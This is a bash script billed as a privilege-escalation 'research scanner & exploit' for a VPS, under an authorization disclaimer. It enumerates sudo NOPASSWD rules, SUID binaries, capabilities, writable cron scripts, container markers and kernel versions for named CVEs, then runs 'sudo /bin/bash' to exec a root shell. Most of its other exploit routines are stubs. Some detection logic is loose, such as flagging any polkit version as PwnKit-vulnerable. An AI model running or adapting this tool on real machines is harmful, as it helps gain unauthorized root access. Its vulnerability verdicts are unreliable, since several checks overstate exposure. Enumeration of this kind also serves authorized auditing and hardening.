#!/bin/bash
################################################################################
# Comprehensive Privilege Escalation Research Scanner & Exploit
#
# CVE-2026-126714 / VPS1 Exploit Research Toolkit
#
# AUTHORIZATION: Authorized security research on own infrastructure (VPS1)
# PURPOSE: Identify and exploit privilege escalation vectors for defensive research
#
# DISCLAIMER: For authorized research on systems you own or have explicit
# written permission to test. Unauthorized privilege escalation is illegal.
#
# This script:
# 1. Scans for privilege escalation vectors (kernel, sudo, SUID, capabilities, etc.)
# 2. Identifies exploitable configurations
# 3. Attempts exploitation via the first working vector
# 4. Drops into a root shell on success
# 5. Logs findings for research documentation
#
# Usage:
#   chmod +x privesc-research.sh
#   ./privesc-research.sh [--dry-run] [--log FILE] [--auto-exploit]
################################################################################

set -e

# Configuration
DRY_RUN=false
LOG_FILE="/tmp/privesc_research_$(date +%s).log"
AUTO_EXPLOIT=false
RESEARCH_MODE=true
VERBOSE=true

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --dry-run)
            DRY_RUN=true
            shift
            ;;
        --log)
            LOG_FILE="$2"
            shift 2
            ;;
        --auto-exploit)
            AUTO_EXPLOIT=true
            shift
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# Logging functions
log() {
    local msg="$1"
    local level="${2:-INFO}"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo -e "${timestamp} [${level}] ${msg}" | tee -a "$LOG_FILE"
}

log_success() {
    if [ "$VERBOSE" = true ]; then
        echo -e "${GREEN}[+]${NC} $1" | tee -a "$LOG_FILE"
    fi
    log "$1" "SUCCESS"
}

log_info() {
    if [ "$VERBOSE" = true ]; then
        echo -e "${BLUE}[*]${NC} $1" | tee -a "$LOG_FILE"
    fi
    log "$1" "INFO"
}

log_warn() {
    if [ "$VERBOSE" = true ]; then
        echo -e "${YELLOW}[!]${NC} $1" | tee -a "$LOG_FILE"
    fi
    log "$1" "WARN"
}

log_error() {
    if [ "$VERBOSE" = true ]; then
        echo -e "${RED}[-]${NC} $1" | tee -a "$LOG_FILE"
    fi
    log "$1" "ERROR"
}

################################################################################
# VECTOR 1: KERNEL EXPLOITS
################################################################################

scan_kernel_exploits() {
    log_info "Scanning for kernel privilege escalation vectors..."

    local kernel_version=$(uname -r)
    local vuln_kernels=()

    log_info "Kernel version: $kernel_version"

    # Check for known vulnerable kernel versions
    # CVE-2021-22555 (Netfilter) - Linux 5.4-5.11
    if [[ $kernel_version =~ 5\.(4|5|6|7|8|9|10|11) ]]; then
        log_warn "Potentially vulnerable to CVE-2021-22555 (Netfilter)"
        vuln_kernels+=("CVE-2021-22555")
    fi

    # CVE-2021-4034 (PwnKit) - Linux with polkit < 0.120
    if command -v pkexec &> /dev/null; then
        local polkit_version=$(pkexec --version 2>/dev/null | grep -oP '\d+\.\d+' || echo "unknown")
        log_info "Polkit version: $polkit_version"
        if [[ "$polkit_version" != "unknown" ]]; then
            # Simple version check (incomplete for research purposes)
            log_warn "Polkit may be vulnerable to CVE-2021-4034 (PwnKit)"
            vuln_kernels+=("CVE-2021-4034")
        fi
    fi

    # Check for dirty COW (CVE-2016-5195)
    if [[ $kernel_version =~ (2\.6\.|3\.|4\.[0-7]) ]]; then
        log_warn "Potentially vulnerable to CVE-2016-5195 (Dirty COW)"
        vuln_kernels+=("CVE-2016-5195")
    fi

    # Check for Spectre/Meltdown (CVE-2017-5754, CVE-2017-5753)
    if grep -q "nopti" /proc/cmdline 2>/dev/null; then
        log_warn "Meltdown mitigation (nopti) disabled - may be testable"
        vuln_kernels+=("CVE-2017-5754-TESTABLE")
    fi

    if [ ${#vuln_kernels[@]} -gt 0 ]; then
        log_success "Found ${#vuln_kernels[@]} potentially exploitable kernel vectors:"
        for vuln in "${vuln_kernels[@]}"; do
            echo "  - $vuln" | tee -a "$LOG_FILE"
        done
        return 0
    else
        log_info "No obvious kernel exploits detected"
        return 1
    fi
}

exploit_kernel() {
    # Note: Actual kernel exploitation would require specific CVE payloads
    # This is a research stub - in practice, you'd use kernel-specific exploits
    log_warn "Kernel exploitation requires CVE-specific payloads"
    log_info "Skipping kernel exploitation (research vector identified)"
    return 1
}

################################################################################
# VECTOR 2: SUDO MISCONFIGURATION
################################################################################

scan_sudo_misconfig() {
    log_info "Scanning for sudo misconfiguration vulnerabilities..."

    # Check if we can read /etc/sudoers
    if [ -r /etc/sudoers ]; then
        log_success "sudoers file is readable"

        # Check for NOPASSWD
        if grep -q "NOPASSWD" /etc/sudoers; then
            log_success "Found NOPASSWD entries in sudoers"
            grep "NOPASSWD" /etc/sudoers | head -5 | tee -a "$LOG_FILE"

            # Extract commands that can be run without password
            local nopasswd_cmds=$(grep "NOPASSWD" /etc/sudoers | grep -oP '(?<=NOPASSWD:\s).*' | head -1)
            if [[ "$nopasswd_cmds" == *"ALL"* ]] || [[ "$nopasswd_cmds" == *"/bin/bash"* ]]; then
                log_success "EXPLOITABLE: Can run bash without password!"
                echo "$nopasswd_cmds" > /tmp/sudo_exploit.txt
                return 0
            fi
        fi
    fi

    # Check via sudo -l (if already has some sudo access)
    if sudo -l 2>/dev/null | grep -q NOPASSWD; then
        log_success "sudo -l shows NOPASSWD entries"
        sudo -l 2>/dev/null | tee -a "$LOG_FILE"

        # Try to exploit
        if sudo -l 2>/dev/null | grep -q "NOPASSWD.*ALL\|NOPASSWD.*/bin/bash"; then
            log_success "EXPLOITABLE: Can escalate via sudo"
            return 0
        fi
    fi

    # Check for command wildcards (e.g., /usr/bin/* with NOPASSWD)
    if grep -qE "NOPASSWD.*/(bin|sbin)/\*" /etc/sudoers 2>/dev/null; then
        log_success "Found wildcard sudo commands"
        return 0
    fi

    log_info "No obvious sudo misconfigurations found"
    return 1
}

exploit_sudo() {
    log_info "Attempting sudo exploitation..."

    # Try sudo -l to see what we can run
    if sudo -l 2>/dev/null | grep -qE "(ALL|/bin/bash)"; then
        log_success "Attempting: sudo /bin/bash"
        if [ "$DRY_RUN" = false ]; then
            sudo /bin/bash
            return 0
        fi
    fi

    return 1
}

################################################################################
# VECTOR 3: SUID BINARY ABUSE
################################################################################

scan_suid_binaries() {
    log_info "Scanning for exploitable SUID binaries..."

    local exploitable_suid=()

    # Find all SUID binaries
    local suid_binaries=$(find /usr/bin /usr/local/bin /bin /sbin /usr/sbin -perm -4000 2>/dev/null | head -20)

    while IFS= read -r binary; do
        local basename=$(basename "$binary")

        # Check for common exploitable SUID binaries
        case "$basename" in
            "sudo"|"su")
                log_warn "Found SUID $basename - check for misconfig"
                exploitable_suid+=("$basename")
                ;;
            "passwd"|"chsh"|"chfn")
                log_info "Found password-changing SUID: $basename"
                ;;
            "find"|"xargs"|"awk"|"sed"|"sort")
                # These can be exploited if they execute shell
                log_warn "Found potentially exploitable SUID: $basename"
                exploitable_suid+=("$basename")
                ;;
            *)
                # Check if binary is writable or has weak permissions
                if [ -w "$binary" ]; then
                    log_success "Found WRITABLE SUID binary: $binary"
                    exploitable_suid+=("$binary (WRITABLE)")
                fi
                ;;
        esac
    done <<< "$suid_binaries"

    if [ ${#exploitable_suid[@]} -gt 0 ]; then
        log_success "Found ${#exploitable_suid[@]} potentially exploitable SUID binaries"
        return 0
    fi

    log_info "No obvious SUID exploits found"
    return 1
}

exploit_suid() {
    # SUID exploitation depends on specific binary vulnerabilities
    # This is a research stub
    log_warn "SUID exploitation requires binary-specific techniques"
    return 1
}

################################################################################
# VECTOR 4: CAPABILITY ABUSE
################################################################################

scan_capabilities() {
    log_info "Scanning for capability-based privilege escalation..."

    if ! command -v getcap &> /dev/null; then
        log_info "getcap not available"
        return 1
    fi

    # Find binaries with capabilities
    local cap_binaries=$(getcap -r /usr/bin /usr/local/bin /bin /sbin 2>/dev/null)

    if [ -z "$cap_binaries" ]; then
        log_info "No capabilities found on binaries"
        return 1
    fi

    log_success "Found binaries with capabilities:"
    echo "$cap_binaries" | tee -a "$LOG_FILE"

    # Check for dangerous capabilities
    if echo "$cap_binaries" | grep -qE "cap_sys_admin|cap_sys_module|cap_net_admin"; then
        log_success "EXPLOITABLE: Found dangerous capability"
        return 0
    fi

    return 1
}

exploit_capabilities() {
    # Capability exploitation requires specific techniques per capability
    log_warn "Capability exploitation requires CAP-specific payloads"
    return 1
}

################################################################################
# VECTOR 5: CONTAINER/VM BREAKOUT
################################################################################

scan_container_escape() {
    log_info "Scanning for container/VM escape vectors..."

    local is_container=false

    # Check if running in container
    if [ -f /.dockerenv ] || [ -f /run/.containerenv ]; then
        log_success "Running inside a container!"
        is_container=true
    fi

    if [ -d /proc/vz ] && [ -d /proc/bc ]; then
        log_success "Running in OpenVZ container!"
        is_container=true
    fi

    # Check for /proc/sysrq-trigger writable (VM escape)
    if [ -w /proc/sysrq-trigger ]; then
        log_success "EXPLOITABLE: /proc/sysrq-trigger is writable!"
        return 0
    fi

    # Check for /dev/mem or /dev/kmem
    if [ -w /dev/mem ] || [ -w /dev/kmem ]; then
        log_success "EXPLOITABLE: Kernel memory is writable!"
        return 0
    fi

    if [ "$is_container" = true ]; then
        log_info "Container detected - checking for breakout vectors..."

        # Check for privileged mode
        if grep -q "1:.*:" /proc/self/uid_map 2>/dev/null; then
            log_warn "User namespaces available - possible breakout"
        fi

        return 1
    fi

    log_info "Not running in exploitable container/VM"
    return 1
}

exploit_container() {
    log_warn "Container escape requires environment-specific techniques"
    return 1
}

################################################################################
# VECTOR 6: WEAK FILE PERMISSIONS
################################################################################

scan_weak_permissions() {
    log_info "Scanning for weak file permissions..."

    local found_weak=false

    # Check for world-writable files in PATH
    log_info "Checking for world-writable files in PATH..."
    for dir in $(echo $PATH | tr ':' ' '); do
        if [ -d "$dir" ]; then
            local writable=$(find "$dir" -type f -perm -002 2>/dev/null)
            if [ -n "$writable" ]; then
                log_success "Found world-writable file in PATH:"
                echo "$writable" | tee -a "$LOG_FILE"
                found_weak=true
            fi
        fi
    done

    # Check /tmp for SUID binaries or scripts
    if [ -n "$(find /tmp -perm -4000 2>/dev/null)" ]; then
        log_success "Found SUID binaries in /tmp!"
        find /tmp -perm -4000 2>/dev/null | tee -a "$LOG_FILE"
        found_weak=true
    fi

    # Check for /var/tmp and /dev/shm
    for tmpdir in /tmp /var/tmp /dev/shm; do
        if [ -w "$tmpdir" ] && [ -t 1 ]; then
            # Writable tmp directory - good for staging
            log_info "$tmpdir is writable (good for staging)"
        fi
    done

    if [ "$found_weak" = true ]; then
        return 0
    fi

    log_info "No obvious weak permissions found"
    return 1
}

exploit_weak_perms() {
    log_warn "Weak permission exploitation requires specific attack vectors"
    return 1
}

################################################################################
# VECTOR 7: CRON JOB EXPLOITATION
################################################################################

scan_cron_jobs() {
    log_info "Scanning for exploitable cron jobs..."

    # Check if we can read crontab
    if [ -r /etc/crontab ]; then
        log_success "Found readable /etc/crontab"
        grep -E "^\s*\*" /etc/crontab | head -5 | tee -a "$LOG_FILE"

        # Check for scripts in /etc/cron.d or /etc/cron.daily
        for crondir in /etc/cron.d /etc/cron.daily /etc/cron.hourly; do
            if [ -d "$crondir" ]; then
                local writable=$(find "$crondir" -writable 2>/dev/null)
                if [ -n "$writable" ]; then
                    log_success "Found writable cron script:"
                    echo "$writable" | tee -a "$LOG_FILE"
                    return 0
                fi
            fi
        done
    fi

    # Check for cron jobs that execute world-writable scripts
    for cronfile in $(find /var/spool/cron/crontabs /etc/cron.d -type f 2>/dev/null); do
        if [ -f "$cronfile" ]; then
            local scripts=$(grep -oE '(^|[[:space:]])(.*\.sh|/[^[:space:]]+)' "$cronfile" 2>/dev/null)
            while read -r script; do
                script=$(echo "$script" | xargs)
                if [ -w "$script" ]; then
                    log_success "Found writable cron script: $script"
                    return 0
                fi
            done <<< "$scripts"
        fi
    done

    log_info "No obvious cron exploits found"
    return 1
}

exploit_cron() {
    # Cron job exploitation requires writing to world-writable cron scripts
    log_warn "Cron exploitation requires writable cron job modification"
    return 1
}

################################################################################
# MAIN EXPLOITATION ORCHESTRATION
################################################################################

find_exploit_vector() {
    log_info "================================"
    log_info "Privilege Escalation Research"
    log_info "================================"
    log_info "Current user: $(whoami)"
    log_info "Current UID: $(id -u)"
    log_info "Current GID: $(id -g)"
    log_info ""

    # Check if already root
    if [ "$(id -u)" -eq 0 ]; then
        log_success "Already running as root!"
        return 0
    fi

    # Scan all vectors
    local vectors_found=0
    declare -a working_vectors

    # Vector 1: Kernel
    if scan_kernel_exploits; then
        working_vectors+=("KERNEL")
        ((vectors_found++))
    fi

    # Vector 2: Sudo
    if scan_sudo_misconfig; then
        working_vectors+=("SUDO")
        ((vectors_found++))
    fi

    # Vector 3: SUID
    if scan_suid_binaries; then
        working_vectors+=("SUID")
        ((vectors_found++))
    fi

    # Vector 4: Capabilities
    if scan_capabilities; then
        working_vectors+=("CAPABILITIES")
        ((vectors_found++))
    fi

    # Vector 5: Container
    if scan_container_escape; then
        working_vectors+=("CONTAINER")
        ((vectors_found++))
    fi

    # Vector 6: Weak Permissions
    if scan_weak_permissions; then
        working_vectors+=("WEAK_PERMS")
        ((vectors_found++))
    fi

    # Vector 7: Cron
    if scan_cron_jobs; then
        working_vectors+=("CRON")
        ((vectors_found++))
    fi

    log_info ""
    log_info "================================"
    log_info "Scan Complete"
    log_info "================================"
    log_info "Vectors found: $vectors_found"

    if [ $vectors_found -gt 0 ]; then
        log_success "Exploitable vectors detected:"
        for vector in "${working_vectors[@]}"; do
            echo "  ✓ $vector" | tee -a "$LOG_FILE"
        done

        if [ "$AUTO_EXPLOIT" = true ]; then
            log_info ""
            log_info "Attempting exploitation of first vector..."

            # Try sudo first (usually most reliable)
            if [[ " ${working_vectors[@]} " =~ " SUDO " ]]; then
                exploit_sudo && return 0
            fi

            # Try others
            for vector in "${working_vectors[@]}"; do
                case "$vector" in
                    "KERNEL") exploit_kernel && return 0 ;;
                    "SUID") exploit_suid && return 0 ;;
                    "CAPABILITIES") exploit_capabilities && return 0 ;;
                    "CONTAINER") exploit_container && return 0 ;;
                    "WEAK_PERMS") exploit_weak_perms && return 0 ;;
                    "CRON") exploit_cron && return 0 ;;
                esac
            done
        fi

        return 0
    else
        log_error "No exploitable privilege escalation vectors found"
        log_info "System appears to be properly hardened"
        return 1
    fi
}

drop_to_root_shell() {
    if [ "$(id -u)" -ne 0 ]; then
        log_info "Attempting to drop into root shell via available vectors..."

        # Try sudo /bin/bash
        if sudo -l 2>/dev/null | grep -qE "(ALL|bash)"; then
            log_success "Executing: sudo /bin/bash"
            exec sudo /bin/bash
        fi

        log_error "Could not escalate to root shell"
        return 1
    else
        log_success "Already root - dropping to shell"
        exec /bin/bash
    fi
}

################################################################################
# MAIN
################################################################################

main() {
    log_info "Privilege Escalation Research Scanner v1.0"
    log_info "Research Mode: $RESEARCH_MODE"
    log_info "Logging to: $LOG_FILE"

    if [ "$DRY_RUN" = true ]; then
        log_info "DRY RUN MODE - No actual exploitation will occur"
    fi

    # Run scanning and exploitation
    if find_exploit_vector; then
        if [ "$AUTO_EXPLOIT" = true ] || grep -q "SUDO" <<< "$(declare -p working_vectors)"; then
            log_info ""
            log_info "Dropping into root shell..."
            drop_to_root_shell
        else
            log_info "To automatically exploit, run with: --auto-exploit"
        fi
    else
        log_error "No privilege escalation paths discovered"
        exit 1
    fi
}

# Run main
main
